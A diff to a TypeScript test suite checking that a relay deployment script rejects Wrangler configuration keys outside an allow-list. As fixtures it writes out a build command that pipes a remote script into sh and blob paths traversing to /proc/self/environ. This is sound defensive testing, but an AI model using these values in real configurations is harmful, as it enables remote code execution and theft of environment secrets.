@@ -83,7 +83,7 @@ describe('R135 the operator bearer is sha256(prefix ‖ token), installed by the
     // The digest is registered with GitHub's log masker the moment it exists, in both jobs.
     expect(workflow.match(/::add-mask::\$operator_token/gu)).toHaveLength(2);
     // Wrangler receives it through the secrets file, not as an argument or a separate `secret put` of the bearer.
-    expect(workflow).toContain('--secrets-file "$RELAY_SECRETS_FILE"');
+    expect(workflow).toContain('--secrets-file "$secrets_file"');
     expect(workflow).not.toMatch(/wrangler secret put RELAY_OPERATOR_TOKEN/u);
   });
 
@@ -192,6 +192,78 @@ describe('R137 relay-config.sh refuses link-store Worker name drift', () => {
   });
 });
 
+describe('E11 relay-config.sh holds the repository configurations to the hand-off allow-list', () => {
+  const storeConfig = 'packages/plugins/catalogs/worker/wrangler.link-store.hosted.json';
+  const hostedConfig = 'packages/plugins/connections/worker/wrangler.hosted.json';
+  const byoConfig = 'packages/plugins/connections/worker/wrangler.jsonc';
+
+  function withTree(mutate: (root: string) => void): { code: number; out: string } {
+    const root = fixtureTree();
+    try {
+      mutate(root);
+      return runScript(root);
+    } finally {
+      rmSync(root, { recursive: true, force: true });
+    }
+  }
+  const addKey = (root: string, file: string, key: string, value: unknown): void => {
+    const path = join(root, file);
+    writeFileSync(path, JSON.stringify({ ...(JSON.parse(readFileSync(path, 'utf8')) as object), [key]: value }));
+  };
+
+  it('E11 the unmodified tree passes', () => {
+    expect(withTree(() => {}).code).toBe(0);
+  });
+
+  for (const file of [hostedConfig, storeConfig]) {
+    for (const [key, value] of [
+      ['build', { command: 'curl https://example.invalid/x | sh' }],
+      ['data_blobs', { SECRET: '../../proc/self/environ' }],
+      ['wasm_modules', { W: '../../proc/self/environ' }],
+      ['text_blobs', { T: '../../proc/self/environ' }],
+      ['rules', []],
+    ] as const) {
+      it(`E11 a \`${key}\` key in ${file.split('/').pop()} is refused`, () => {
+        const { code, out } = withTree(root => addKey(root, file, key, value));
+        expect(code).not.toBe(0);
+        expect(out).toContain('carries a key outside');
+      });
+    }
+  }
+
+  it('E11 a build or blob key in a self-hosted configuration is refused too', () => {
+    const { code, out } = withTree(root => {
+      const path = join(root, byoConfig);
+      writeFileSync(path, readFileSync(path, 'utf8').replace(/^\{/u, '{\n  "build": { "command": "true" },'));
+    });
+    expect(code).not.toBe(0);
+    expect(out).toContain('must carry no build, data_blobs, wasm_modules or text_blobs key');
+  });
+
+  it('E11 a workflow allow-list that admits a build or blob key is refused', () => {
+    const { code, out } = withTree(root => {
+      const path = join(root, '.github/workflows/relay-hosted.yaml');
+      writeFileSync(path, readFileSync(path, 'utf8').replace('"workers_dev"]', '"workers_dev","data_blobs"]'));
+    });
+    expect(code).not.toBe(0);
+    expect(out).toContain('HANDOFF_CONFIG_KEYS must not allow');
+  });
+
+  it('E11 a workflow that stops pinning the Worker name its configuration carries is refused', () => {
+    for (const workflow of ['relay-hosted.yaml', 'link-store-hosted.yaml']) {
+      const { code, out } = withTree(root => {
+        const path = join(root, '.github/workflows', workflow);
+        writeFileSync(
+          path,
+          readFileSync(path, 'utf8').replace(/--arg name ferretry-hosted-[a-z-]+ /u, '--arg name another-worker '),
+        );
+      });
+      expect(code).not.toBe(0);
+      expect(out).toContain('must pin the handed-over configuration');
+    }
+  });
+});
+
 describe('R227 the relay deploy does not touch the link store', () => {
   const workflow = (): string => workflowText();
   const parsed = (): { on: { push: { paths: string[] } }; jobs: Record<string, unknown> } =>
@@ -212,9 +284,11 @@ describe('R227 the relay deploy does not touch the link store', () => {
       .filter(line => !line.trim().startsWith('#'))
       .filter(line => /\bwrangler (deploy|secret|publish|delete|versions|rollback)/u.test(line));
     expect(calls.length).toBeGreaterThanOrEqual(2);
-    for (const line of calls) expect(line).toContain('--config wrangler.hosted.json');
+    // By the relay's configuration, or (in the job that holds the token and has no checkout, so no configuration file)
+    // by the relay Worker's own name.
+    for (const line of calls) expect(line).toMatch(/--config wrangler\.hosted\.json|--name ferretry-hosted-relay/u);
     // `--secrets-file` rides the relay deploy; its content is the operator bearer (+ the pool), nothing for the store.
-    expect(workflow()).toContain('--config wrangler.hosted.json --tag "$RELAY_BUNDLE"');
+    expect(workflow()).toContain('--config wrangler.hosted.json --no-bundle --tag "$built"');
   });
 
   it('R227 the deploy runs on changes to the relay package only, so a store change cannot trigger it', () => {
